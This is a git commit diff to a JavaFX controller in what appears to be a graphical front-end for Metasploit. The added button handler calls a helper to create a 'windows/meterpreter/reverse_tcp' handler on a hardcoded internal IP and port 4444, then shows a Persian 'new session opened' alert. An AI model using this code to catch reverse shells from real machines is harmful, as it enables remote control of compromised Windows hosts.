cdff0e64a212323cc0e4789fb7414672eb0e87d5
yasmir <ymirzae@gmail.com>
2018-08-09 19:36:09 +0430

    ok ok ok

--- msf/src/msf/MsfLoginHereController.java
+++ msf/src/msf/MsfLoginHereController.java
@@ -6,10 +6,19 @@
 package msf;
 
 import com.jfoenix.controls.JFXButton;
+import java.io.File;
 import java.net.URL;
 import java.util.ResourceBundle;
+import java.util.logging.Level;
+import java.util.logging.Logger;
+import javafx.application.Platform;
 import javafx.fxml.FXML;
 import javafx.fxml.Initializable;
+import javafx.scene.control.Alert;
+import javafx.scene.image.Image;
+import javafx.scene.image.ImageView;
+import javafx.scene.input.MouseEvent;
+import javafx.scene.layout.AnchorPane;
 
 /**
  * FXML Controller class
@@ -18,17 +27,67 @@ import javafx.fxml.Initializable;
  */
 public class MsfLoginHereController implements Initializable {
 
-    
-    @FXML JFXButton btn_shonud;
-    
-    
-    
+    @FXML
+    JFXButton btn_shonud;
+    @FXML
+    AnchorPane pane;
+
+    private BIL bil;
+
+    public void setBIL(BIL bil) {
+        this.bil = bil;
+    }
+
     /**
      * Initializes the controller class.
      */
     @Override
     public void initialize(URL url, ResourceBundle rb) {
         // TODO
-    }    
-    
+    }
+
+    @FXML
+    void EsteragSam(MouseEvent mouseEvent) {
+
+        //thread here
+        Thread thr = new Thread(new Runnable() {
+            @Override
+            public void run() {
+                try {
+                    //System.out.println(bil.token);
+                    String consoleID = bil.createHandler("10.20.21.123", "4444", "windows/meterpreter/reverse_tcp");
+                    if (consoleID != null) {
+                        // open meterpreter form to cumminate user with it
+                    }
+                } catch (InterruptedException ex) {
+                    //view errors to user
+                    Logger.getLogger(MsfLoginHereController.class.getName()).log(Level.SEVERE, null, ex);
+                }
+
+                Platform.runLater(new Runnable() {
+                    @Override
+                    public void run() {
+                        Alert alert = new Alert(Alert.AlertType.INFORMATION);
+                        alert.setTitle("مژده");
+                        alert.setContentText("نشست جدید با موفقیت باز شد");
+                        alert.showAndWait();
+                    }
+                });
+                /*
+                ImageView imageView = new ImageView();
+                File file = new File("src/back.png");
+                Image image = new Image(file.toURI().toString());
+                imageView.setImage(image);
+
+                Session sampleSession
+                        = new Session("Android Device", 10, 20, imageView) {
+                };
+
+                pane.getChildren().add(sampleSession);*/
+            }
+        });
+        thr.start();
+
+    }
+
 }
